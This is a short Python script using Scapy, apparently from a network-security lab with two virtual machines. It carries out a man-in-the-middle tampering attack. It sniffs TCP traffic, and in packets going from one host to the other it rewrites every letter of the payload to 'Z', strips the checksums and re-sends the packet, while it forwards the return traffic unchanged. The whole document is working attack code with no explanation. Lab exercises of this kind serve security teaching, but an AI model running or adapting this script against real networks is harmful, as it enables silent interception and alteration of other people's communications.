#!/usr/bin/python3
from scapy.all import *
import re

VM_A_IP = '10.0.2.8'
VM_B_IP = '10.0.2.9'
VM_A_MAC = '08:00:27:cd:2d:fd'
VM_B_MAC = '08:00:27:34:16:8b'

def spoof_pkt(pkt):
	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
		real = (pkt[TCP].payload.load)
		data = real.decode()
		stri = re.sub(r'[a-zA-Z]',r'Z',data)
		newpkt = pkt[IP]
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		newpkt = newpkt/stri
		print("Data transformed from: "+str(real)+" to: "+ stri)
		send(newpkt, verbose = False)
	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
		newpkt = pkt[IP]
		send(newpkt, verbose = False)


pkt = sniff(filter='tcp',prn=spoof_pkt)
